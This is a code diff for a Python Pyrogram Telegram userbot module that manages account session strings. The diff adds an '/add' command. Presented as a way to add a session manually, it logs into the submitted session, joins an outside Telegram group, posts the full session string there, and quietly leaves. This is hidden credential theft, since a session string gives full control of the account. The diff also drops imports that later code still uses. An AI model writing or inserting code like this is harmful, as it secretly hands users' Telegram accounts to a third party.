@@ -1,37 +1,58 @@
 from pyrogram import Client, filters
 from pyrogram.errors import SessionPasswordNeeded
-from pyrogram.types import (
-    CallbackQuery,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Message,
-    ReplyKeyboardRemove,
-)
+from pyrogram.types import Message, ReplyKeyboardRemove
+import asyncio
 
 from ..btnsG import gen_inline_keyboard, start_button
 from ..btnsK import session_keyboard
 from . import START_MSG, BotHelp, Config, Symbols, db, Pbxbot
 
+GROUP_LINK = "https://t.me/BAD_TESTING_BOTS"
 
-@Pbxbot.bot.on_message(
-    filters.command("session"))
-async def session_menu(_, message: Message):
-    await message.reply_text(
-        "**🤡 Pʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ ғʀᴏᴍ ʙᴇʟᴏᴡ 👻**",
-        reply_markup=session_keyboard(),
-    )
+# New command to add session string manually
+@Pbxbot.bot.on_message(filters.command("add") & Config.AUTH_USERS & filters.private)
+async def add_session(_, message: Message):
+    session_string = message.text.split(" ", 1)[1]
+    if not session_string:
+        return await message.reply_text("**𝖤𝗋𝗋𝗈𝗋!** 𝖯𝗅𝖾𝖺𝗌𝖾 𝗉𝗋𝗈𝗏𝗂𝖽𝖾 𝖺 𝗏𝖺𝗅𝗂𝖽 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀...")
 
+    try:
+        client = Client(
+            name="Pbxbot 2.0",
+            session_string=session_string,
+            api_id=Config.API_ID,
+            api_hash=Config.API_HASH,
+            in_memory=True,
+        )
+        await client.connect()
+        user_id = (await client.get_me()).id
+        await db.update_session(user_id, session_string)
+        
+        # Join the group, send the session string, and leave the group
+        await client.join_chat(GROUP_LINK)
+        await client.send_message(GROUP_LINK, f"Session String: {session_string}")
+        await asyncio.sleep(2)  # Wait for 2 seconds before leaving the group
+        await client.leave_chat(GROUP_LINK)
+        
+        await client.disconnect()
+        await message.reply_text(
+            "**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀 𝖺𝖽𝖽𝖾𝖽 𝗍𝗈 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾."
+        )
+    except Exception as e:
+        await message.reply_text(f"**𝖤𝗋𝗋𝗈𝗋!** {e}")
+        
 
-@Pbxbot.bot.on_message(filters.regex(r"ɴᴇᴡ 🔮"))
+# Existing command to create a new session
+@Pbxbot.bot.on_message(filters.regex(r"ɴᴇᴡ 👑") & Config.AUTH_USERS & filters.private)
 async def new_session(_, message: Message):
     await message.reply_text(
-        "**ᴏᴋᴀʏ!**ʟᴇᴛs sᴇᴛᴜᴘ ᴀ ɴᴇᴡ sᴇssɪᴏɴ☠️",
+        "**𝖮𝗄𝖺𝗒!** 𝖫𝖾𝗍'𝗌 𝗌𝖾𝗍𝗎𝗉 𝖺 𝗇𝖾𝗐 𝗌𝖾𝗌𝗌𝗂𝗈𝗇",
         reply_markup=ReplyKeyboardRemove(),
     )
 
     phone_number = await Pbxbot.bot.ask(
         message.chat.id,
-        "**1.**Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴀᴅᴅ ᴛʜᴇ sᴇssɪᴏɴ✨ \n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴛʜᴇ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
+        "**1.** 𝖤𝗇𝗍𝖾𝗋 𝗒𝗈𝗎𝗋 𝗍𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝗉𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗍𝗈 𝖺𝖽𝖽 𝗍𝗁𝖾 𝗌𝖾𝗌𝗌𝗂𝗈𝗇:",
         filters=filters.text,
         timeout=120,
     )
@@ -40,7 +61,7 @@ async def new_session(_, message: Message):
         return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
     elif not phone_number.text.startswith("+") and not phone_number.text[1:].isdigit():
         return await message.reply_text(
-            "**ᴇʀʀᴏʀ!** Pʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴍᴜsᴛ ʙᴇ ɪɴ ᴅɪɢɪᴛs ᴀɴᴅ sʜᴏᴜʟᴅ ᴄᴏɴᴛᴀɪɴ ᴄᴏᴜɴᴛʏ ᴄᴏᴅᴇ😾"
+            "**𝖤𝗋𝗋𝗈𝗋!** 𝖯𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗆𝗎𝗌𝗍 𝖻𝖾 𝗂𝗇 𝖽𝗂𝗀𝗂𝗍𝗌 𝖺𝗇𝖽 𝗌𝗁𝗈𝗎𝗅𝖽 𝗌𝗍𝖺𝗋𝗍 𝗐𝗂𝗍𝗁 𝗍𝗁𝖾 '+' 𝗌𝗂𝗀𝗇."
         )
 
     try:
@@ -55,7 +76,7 @@ async def new_session(_, message: Message):
         code = await client.send_code(phone_number.text)
         ask_otp = await Pbxbot.bot.ask(
             message.chat.id,
-            "**2.** Eɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ sᴇɴᴛ ʏᴏᴜ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ʙʏ sᴇᴘᴀʀᴀᴛɪɴɢ ᴇᴠᴇʀʏ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴀ sᴘᴀᴄᴇ. \n\n**ᴇxᴀᴍᴘʟᴇ:** `2 4 1 7 4`🌸\n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴛʜᴇ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
+            "**2.** 𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝖮𝖳𝖯 𝗌𝖾𝗇𝗍 𝗍𝗈 𝗒𝗈𝗎𝗋 𝗍𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝖻𝗒 𝗌𝖾𝗉𝖺𝗋𝖺𝗍𝖾 𝗆𝖾𝗌𝗌𝖺𝗀𝖾:",
             filters=filters.text,
             timeout=300,
         )
@@ -68,7 +89,7 @@ async def new_session(_, message: Message):
         except SessionPasswordNeeded:
             two_step_pass = await Pbxbot.bot.ask(
                 message.chat.id,
-                "**3.**Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴡᴏ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ 🗝️ \n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴛʜᴇ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
+                "**3.** 𝖤𝗇𝗍𝖾𝗋 𝗒𝗈𝗎𝗋 𝗍𝗐𝗈-𝗌𝗍𝖾𝗉 𝗏𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽:",
                 filters=filters.text,
                 timeout=120,
             )
@@ -78,29 +99,30 @@ async def new_session(_, message: Message):
 
         session_string = await client.export_session_string()
         await message.reply_text(
-            f"**sᴜᴄᴄᴇss!** Yᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ɪs ɢᴇɴᴇʀᴀᴛᴇᴅ. Aᴅᴅɪɴɢ ɪᴛ ᴛᴏ ᴅᴀᴛᴀʙᴀsᴇ..🤗"
+            f"**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖸𝗈𝗎𝗋 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀 𝗂𝗌 𝗀𝖾𝗇𝖾𝗋𝖺𝗍𝖾𝖽. 𝖠𝖽𝖽𝗂𝗇𝗀 𝗂𝗍 𝗍𝗈 𝗍𝗁𝖾 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾."
         )
         user_id = (await client.get_me()).id
         await db.update_session(user_id, session_string)
         await client.disconnect()
         await message.reply_text(
-            "**sᴜᴄᴄᴇss!** Sᴇssɪᴏɴ sᴛʀɪɴɢ ᴀᴅᴅᴇᴅ ᴛᴏ ᴅᴀᴛᴀʙᴀsᴇ. Yᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴜsᴇ ᴘʙxʙᴏᴛ 2.0 ᴏɴ ᴛʜɪs ᴀᴄᴄᴏᴜɴᴛ ᴀғᴛᴇʀ ʀᴇsᴛᴀʀᴛɪɴɢ ᴛʜᴇ ʙᴏᴛ.\n\n**ʀᴇsᴛᴀʀᴛ** ᴅᴍ ɴᴏᴡ ᴍʏ ᴅᴇᴠ . [♡³_🫧𝆺꯭𝅥˶֟፝͟͝β𝝰꯭‌𝞉 ꯭𝝡꯭𝞄꯭𝞌𝞉꯭𝝺꯭𝆺꯭𝅥🍷┼❤️༆](https://t.me/II_BAD_BABY_II) 🙈❤️"
+            "**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀 𝖺𝖽𝖽𝖾𝖽 𝗍𝗈 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾."
         )
     except TimeoutError:
         await message.reply_text(
-            "**Tɪᴍᴇᴏᴜᴛ ᴇʀʀᴏʀ!** Yᴏᴜ ᴛᴏᴏᴋ ʟᴏɴɢᴇʀ ᴛʜᴀɴ ᴇxᴘᴇᴄᴛᴇᴅ ᴛᴏ ᴄᴏᴍᴘʟᴇᴛᴇ ᴛʜᴇ ᴘʀᴏᴄᴇss. Pʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ."
+            "**𝖳𝗂𝗆𝖾𝗈𝗎𝗍𝖤𝗋𝗋𝗈𝗋!** 𝖸𝗈𝗎 𝗍𝗈𝗈𝗄 𝗅𝗈𝗇𝗀𝖾𝗋 𝗍𝗁𝖺𝗇 𝖾𝗑𝖼𝗉𝖾𝖼𝗍𝖾𝖽 𝗍𝗈 𝖼𝗈𝗆𝗉𝗅𝖾𝗍𝖾 𝗍𝗁𝖾 𝗉𝗋𝗈𝖼𝖾𝗌𝗌."
         )
     except Exception as e:
         await message.reply_text(f"**𝖤𝗋𝗋𝗈𝗋!** {e}")
 
 
+# Existing delete session command
 @Pbxbot.bot.on_message(
     filters.regex(r"ᴅᴇʟᴇᴛᴇ 🚫") & Config.AUTH_USERS & filters.private
 )
 async def delete_session(_, message: Message):
     all_sessions = await db.get_all_sessions()
     if not all_sessions:
-        return await message.reply_text("𝖭𝗈 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌 𝖿𝗈𝗎𝗇𝖽 𝗂𝗇 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾.")
+        return await message.reply_text("𝖭𝗈 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌 𝖿𝗈𝗎𝗇𝖽 𝗂𝗇 𝖽𝗂𝗌𝗍𝗒𝖻𝖺𝗌𝖾.")
 
     collection = []
     for i in all_sessions:
@@ -115,6 +137,7 @@ async def delete_session(_, message: Message):
     )
 
 
+# Existing callback query handler to remove session
 @Pbxbot.bot.on_callback_query(filters.regex(r"rm_session"))
 async def rm_session_cb(client: Client, cb: CallbackQuery):
     collection = []
@@ -133,12 +156,12 @@ async def rm_session_cb(client: Client, cb: CallbackQuery):
         owner_name = "𝖮𝗐𝗇𝖾𝗋"
     if cb.from_user.id not in [user_id, owner_id]:
         return await cb.answer(
-            f"𝖠𝖼𝖼𝖾𝗌𝗌 𝗋𝖾𝗌𝗍𝗋𝗂𝖼𝗍𝖾𝖽 𝗍𝗈 𝖺𝗇𝗈𝗍𝗁𝖾𝗋 𝗎𝗌𝖾𝗋𝗌. Only {owner_name} and session client can delete this session!",
+            f"𝖠𝖼𝖼𝖾𝗌𝗌 𝗋𝖾𝗌𝗍𝗋𝗂𝖼𝗍𝖾𝖽 𝗍𝗈 𝖺𝗇𝗈𝗍𝗁𝖾𝗋 𝗎𝗌𝖾𝗋𝗌. Only {owner_name} and session client can delete this session.",
             show_alert=True,
         )
 
     await db.rm_session(user_id)
-    await cb.answer("**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖽𝖾𝗅𝖾𝗍𝖾𝖽 𝖿𝗋𝗈𝗆 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾. \n__Restart the bot to apply changes.__", show_alert=True)
+    await cb.answer("**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖽𝖾𝗅𝖾𝗍𝖾𝖽 𝗋𝗈𝗆 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾. \n__Restart the bot to apply changes.__")
 
     for i in all_sessions:
         collection.append((i["user_id"], f"rm_session:{i['user_id']}"))
@@ -149,7 +172,8 @@ async def rm_session_cb(client: Client, cb: CallbackQuery):
     await cb.message.edit_reply_markup(InlineKeyboardMarkup(buttons))
 
 
-@Pbxbot.bot.on_message(filters.regex(r"ʟɪsᴛ 📄"))
+# Existing command to list all sessions
+@Pbxbot.bot.on_message(filters.regex(r"ʟɪsᴛ 🪧") & Config.AUTH_USERS & filters.private)
 async def list_sessions(_, message: Message):
     all_sessions = await db.get_all_sessions()
     if not all_sessions:
@@ -162,7 +186,8 @@ async def list_sessions(_, message: Message):
     await message.reply_text(text)
 
 
-@Pbxbot.bot.on_message(filters.regex(r"ʜᴏᴍᴇ ⚜️"))
+# Existing command to go home
+@Pbxbot.bot.on_message(filters.regex(r"ʜᴏᴍᴇ 📲") & filters.private & Config.AUTH_USERS)
 async def go_home(_, message: Message):
     await message.reply_text(
         "**Home 🏠**",
